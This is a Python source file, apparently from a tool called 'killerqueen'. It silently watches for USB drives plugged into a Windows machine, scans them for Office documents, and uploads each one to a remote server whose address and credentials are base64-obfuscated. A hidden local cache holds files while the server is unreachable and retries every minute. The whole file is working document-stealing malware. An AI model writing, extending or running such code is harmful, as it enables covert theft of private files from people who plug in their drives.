import json
import os
import shutil
import time
import uuid

import requests
import base64
import logging
import win32api
import threading
from requests.auth import HTTPBasicAuth
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

from killerqueen import utils
from killerqueen.config import OFFICE_EXTENSIONS, UPLOAD_URL, USERNAME, PASSWORD, CACHE_DIR, SERVER_URL, PING_TIMEOUT, LOCAL_VERSION

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

UPLOAD_URL = base64.b64decode(UPLOAD_URL).decode('utf-8')

if not os.path.exists(CACHE_DIR):
    os.makedirs(CACHE_DIR)
    os.system(f"attrib +h {CACHE_DIR}")

def is_server_reachable():
    try:
        response = requests.head(base64.b64decode(SERVER_URL).decode('utf-8'), timeout=PING_TIMEOUT)
        return response.status_code == 200
    except requests.RequestException:
        return False

def cache_file(file_path):
    file_name = os.path.basename(file_path)
    cache_path = os.path.join(CACHE_DIR, file_name)
    try:
        shutil.copy2(file_path, cache_path)
        logging.info(f"File {file_path} cached locally: {cache_path}")
    except Exception as e:
        logging.error(f"Error caching file: {e}")

def upload_cached_files():
    if is_server_reachable():
        for file_name in os.listdir(CACHE_DIR):
            cache_path = os.path.join(CACHE_DIR, file_name)
            if os.path.isfile(cache_path):
                logging.info(f"Attempting to upload cached file: {cache_path}")
                try:
                    USBEventHandler('').upload_file(cache_path)
                    os.remove(cache_path)
                    logging.info(f"Successfully uploaded and deleted cached file: {cache_path}")
                except Exception as e:
                    logging.error(f"Error uploading cached file: {e}")
    else:
        logging.warning("Server is still unreachable, waiting to reconnect...")

class USBEventHandler(FileSystemEventHandler):
    def __init__(self, drive_letter):
        self.drive_letter = drive_letter

    def on_created(self, event):
        if event.is_directory:
            return
        _, ext = os.path.splitext(event.src_path)
        if ext.lower() in OFFICE_EXTENSIONS:
            logging.info(f"New file detected: {event.src_path}")
            self.upload_file(event.src_path)

    def upload_file(self, file_path):
        time.sleep(3)
        try:
            if not is_server_reachable():
                logging.warning(f"Server is unreachable, caching file {file_path} locally")
                cache_file(file_path)
                return

            uuid_file_name = str(uuid.uuid4())

            timestamp = time.strftime("%Y%m%d_%H%M%S", time.localtime())
            file_name = os.path.basename(file_path)
            metadata = {
                "original_file_name": file_name,
                "timestamp": timestamp,
                "client_ip": utils.get_ip_from_website(),
                "client_version": LOCAL_VERSION
            }

            with open(file_path, 'rb') as f:
                files = {'file': (uuid_file_name, f)}
                data = {'metadata': json.dumps(metadata)}
                response = requests.post(
                    UPLOAD_URL,
                    files=files,
                    data=data,
                    auth=HTTPBasicAuth(USERNAME, base64.b64decode(PASSWORD).decode('utf-8'))
                )

            if response.status_code == 200:
                logging.info(f"{file_path} uploaded successfully!")
            else:
                logging.warning(f"Failed to upload {file_path}, status code: {response.status_code}, error: {response.text}")
        except requests.RequestException as e:
            logging.error(f"Network error during file upload: {e}")
        except Exception as e:
            logging.error(f"Other error during file upload: {e}")

def scan_and_upload(drive_letter):
    logging.info(f"Scanning drive {drive_letter}...")
    for root, _, files in os.walk(drive_letter):
        for file in files:
            _, ext = os.path.splitext(file)
            if ext.lower() in OFFICE_EXTENSIONS:
                file_path = os.path.join(root, file)
                logging.info(f"Eligible file found: {file_path}")
                try:
                    USBEventHandler(drive_letter).upload_file(file_path)
                except Exception as e:
                    logging.error(f"Error uploading file: {e}")

def monitor_usb(drive_letter):
    path = f"{drive_letter}"
    if not os.path.exists(path):
        logging.error(f"Drive {drive_letter} not detected")
        return

    scan_and_upload(drive_letter)

    event_handler = USBEventHandler(drive_letter)
    observer = Observer()
    observer.schedule(event_handler, path, recursive=True)
    observer.start()
    logging.info(f"Started monitoring device at {drive_letter}:\\")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
    observer.join()

def detect_usb_drive():
    initial_drives = set(win32api.GetLogicalDriveStrings().split('\x00')[:-1])
    monitored_drives = set()
    while True:
        current_drives = set(win32api.GetLogicalDriveStrings().split('\x00')[:-1])
        new_drives = current_drives - initial_drives
        removed_drives = initial_drives - current_drives

        for drive in new_drives:
            drive_path = f"{drive}\\"
            logging.info(f"New drive detected: {drive_path}")
            time.sleep(2)

            if os.path.exists(drive_path):
                logging.info(f"Drive {drive_path} is mounted and accessible")
                try:
                    files = os.listdir(drive_path)
                    logging.info(f"Drive {drive} is accessible")
                    if drive not in monitored_drives:
                        monitored_drives.add(drive)
                        threading.Thread(target=monitor_usb, args=(drive,)).start()
                except Exception as e:
                    logging.error(f"Unable to access drive {drive}, error: {e}")
                    continue

        for drive in removed_drives:
            if drive in monitored_drives:
                monitored_drives.remove(drive)
                logging.info(f"Drive {drive} has been removed")

        initial_drives = current_drives
        time.sleep(1)

def periodic_cache_upload():
    while True:
        upload_cached_files()
        time.sleep(60)

threading.Thread(target=periodic_cache_upload, daemon=True).start()
